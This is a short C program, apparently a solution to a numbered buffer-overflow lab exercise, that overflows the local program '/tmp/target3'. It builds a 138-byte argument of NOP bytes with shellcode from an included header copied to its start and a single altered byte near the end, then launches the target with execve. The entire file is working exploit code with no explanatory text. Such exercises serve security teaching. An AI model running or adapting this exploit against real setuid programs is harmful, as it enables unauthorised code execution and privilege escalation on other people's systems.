#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(int argc, char* argv[])
{
  char *args[3];
  char *env[1];
  int i;

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  int bufSize = 138;
  args[1] = malloc(bufSize);
  memset(args[1],0x90,bufSize-1);
  args[1][bufSize -2] = 52; // atoi(argv[1]);
  args[1][bufSize - 1] = '\0';
  memcpy(args[1], shellcode, strlen(shellcode));
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
